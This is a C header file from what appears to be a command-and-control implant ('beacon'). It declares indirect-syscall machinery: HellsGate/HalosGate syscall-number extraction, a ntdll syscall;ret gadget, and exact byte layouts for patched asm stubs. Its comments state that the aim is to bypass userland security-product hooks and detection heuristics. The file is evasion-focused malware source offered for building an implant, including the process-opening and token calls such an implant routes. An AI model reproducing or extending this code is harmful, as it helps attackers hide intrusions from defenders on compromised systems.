/* beacon/include/Syscall.h
 * P1 — indirect syscalls (HellsGate/HalosGate SSN extraction + Tartarus
 * in-ntdll syscall;ret gadget) for the beacon's direct Nt* calls.
 *
 * Each Nt* function pointer (Nax->Ntdll.NtX) is swapped for an asm stub
 * (NaxSc_NtX) that does:  mov r10,rcx ; mov eax,<SSN> ; mov r11,<gadget> ; jmp r11
 * The SSN and the ntdll `syscall;ret` gadget address are patched into the stub
 * at boot by NaxSyscallsInit (in Core/Syscall.c). The `syscall` instruction
 * therefore executes INSIDE ntdll (indirect, never direct) — bypasses userland
 * ntdll-stub hooks AND avoids the "syscall from non-image region" heuristic.
 *
 * The stub byte layout is fixed and SHARED between this header and
 * asm/Syscall.x64.asm. NaxSyscallsInit asserts the template bytes before
 * patching so a layout mismatch fails loudly (and falls back to direct resolve)
 * rather than corrupting the stub. */

#pragma once
#include "Defs.h"

#ifndef EXTERN_C
/* hidden visibility on the NaxSc_* stubs is necessary but NOT sufficient.
 * The beacon is a flat .text blob (objcopy --dump-section .text) with NO .reloc
 * table, so any `.refptr.NaxSc_*` GOT absolute pointer is never relocated and
 * faults when the loader maps the beacon at base != 0x10000000. hidden visibility
 * makes gcc emit a direct PC-relative `lea` for the address -- but ONLY when the
 * address is returned in a register; STORING it to a memory lvalue still emits a
 * .refptr even when hidden. The actual fix is NaxScStubAddr() in Syscall.c (a
 * noinline register-return wrapper). Hidden here is a defensive guard in case
 * -fvisibility=hidden is ever dropped from the Makefile.                           */
#define EXTERN_C extern __attribute__( ( visibility( "hidden" ) ) )
#endif

/* ========= [ syscall table index ] =========
 * Order is arbitrary but MUST match the %macro invocation order in
 * asm/Syscall.x64.asm and the per-syscall resolve list in Syscall.c.        */

typedef enum _NAX_SC {
    NAX_SC_NtAllocateVirtualMemory   = 0,
    NAX_SC_NtProtectVirtualMemory,
    NAX_SC_NtFreeVirtualMemory,
    NAX_SC_NtOpenProcessToken,
    NAX_SC_NtQueryInformationToken,
    NAX_SC_NtQueryInformationProcess,
    NAX_SC_NtSetInformationProcess,
    NAX_SC_NtClose,
    NAX_SC_NtQuerySystemInformation,
    NAX_SC_NtQueryVirtualMemory,
    NAX_SC_NtOpenProcess,
    NAX_SC_NtTerminateProcess,
    NAX_SC_COUNT
} NAX_SC;

/* ========= [ per-instance syscall state ] ========= */

typedef struct _NAX_SYSCALLS {
    DWORD  Ssn[ NAX_SC_COUNT ];   /* syscall numbers (HellsGate/HalosGate) */
    PVOID  Gadget;                 /* ntdll `syscall; ret` gadget address  */
} NAX_SYSCALLS, *PNAX_SYSCALLS;

/* ========= [ stub byte layout — shared with asm/Syscall.x64.asm ] =========
 *
 *   +0  4C 8B D1           mov r10, rcx        (3 bytes)
 *   +3  B8 <ssn32>         mov eax, imm32      (5 bytes)  SSN imm at +4
 *   +8  49 BB <gad64>      mov r11, imm64      (10 bytes)  gadget imm at +10
 *   +18 41 FF E3           jmp r11             (3 bytes)
 *   total 21 bytes / stub
 *
 * NaxSyscallsInit patches bytes +4..+7 (SSN) and +10..+17 (gadget) per stub. */

#define NAX_SC_STUB_SIZE        21

#define NAX_SC_BYTE0_MOV_R10    0x4C    /* mov r10,rcx prologue */
#define NAX_SC_BYTE1_MOV_R10    0x8B
#define NAX_SC_BYTE2_MOV_R10    0xD1
#define NAX_SC_BYTE_MOV_EAX     0xB8    /* mov eax, imm32 opcode */
#define NAX_SC_BYTE_MOV_R11     0x49    /* REX.B prefix of mov r11, imm64 */
#define NAX_SC_BYTE_MOV_R11_2   0xBB    /* mov r11, imm64 opcode */

#define NAX_SC_OFF_SSN          4       /* imm32 of `mov eax` */
#define NAX_SC_OFF_GADGET       10      /* imm64 of `mov r11` */

/* ========= [ ntdll stub recognition (HellsGate) ] =========
 * Win10/11 ntdll Nt/Zw stub prologue:
 *   4C 8B D1          mov r10, rcx
 *   B8 <ssn32>        mov eax, SSN
 *   ...               (test SharedUserData+0x308 ; jnz int 2Eh)
 *   0F 05             syscall
 *   C3                ret
 * SSN lives at stub+4. */

#define NAX_NT_PROLOGUE_0       0x4C
#define NAX_NT_PROLOGUE_1       0x8B
#define NAX_NT_PROLOGUE_2       0xD1
#define NAX_NT_PROLOGUE_3       0xB8
#define NAX_NT_OFF_SSN          4

/* syscall;ret gadget signature scanned for in ntdll .text */
#define NAX_SC_GADGET_BYTE0     0x0F    /* syscall */
#define NAX_SC_GADGET_BYTE1     0x05
#define NAX_SC_GADGET_BYTE2     0xC3    /* ret     */

/* sentinel for an unresolved SSN (HellsGate+HalosGate both failed) */
#define NAX_SC_SSN_INVALID      0xFFFFFFFFu

/* ========= [ asm stub externs ] =========
 * Each NaxSc_NtX is a function with the SAME signature as the real NtX, so it
 * can be stored in the D_API(NtX) function-pointer slot unchanged.            */

EXTERN_C PVOID NaxSc_NtAllocateVirtualMemory( VOID );
EXTERN_C PVOID NaxSc_NtProtectVirtualMemory( VOID );
EXTERN_C PVOID NaxSc_NtFreeVirtualMemory( VOID );
EXTERN_C PVOID NaxSc_NtOpenProcessToken( VOID );
EXTERN_C PVOID NaxSc_NtQueryInformationToken( VOID );
EXTERN_C PVOID NaxSc_NtQueryInformationProcess( VOID );
EXTERN_C PVOID NaxSc_NtSetInformationProcess( VOID );
EXTERN_C PVOID NaxSc_NtClose( VOID );
EXTERN_C PVOID NaxSc_NtQuerySystemInformation( VOID );
EXTERN_C PVOID NaxSc_NtQueryVirtualMemory( VOID );
EXTERN_C PVOID NaxSc_NtOpenProcess( VOID );
EXTERN_C PVOID NaxSc_NtTerminateProcess( VOID );

/* ========= [ resolver entry ] =========
 * NaxSyscallsInit: resolves SSNs (HellsGate, HalosGate fallback), finds one
 * ntdll `syscall;ret` gadget, patches the 12 stubs in-place, and sets each
 * Nax->Ntdll.NtX pointer to its stub. Per-syscall: on success → indirect stub;
 * on failure → the caller leaves Nax->Ntdll.NtX at the direct NaxGetProc result
 * (graceful per-syscall fallback). Returns the number of syscalls routed
 * indirectly. Nax->Ntdll.Handle MUST be set (hNtdll) before calling.            */

EXTERN_C UINT32 NaxSyscallsInit( PNAX_INSTANCE Nax );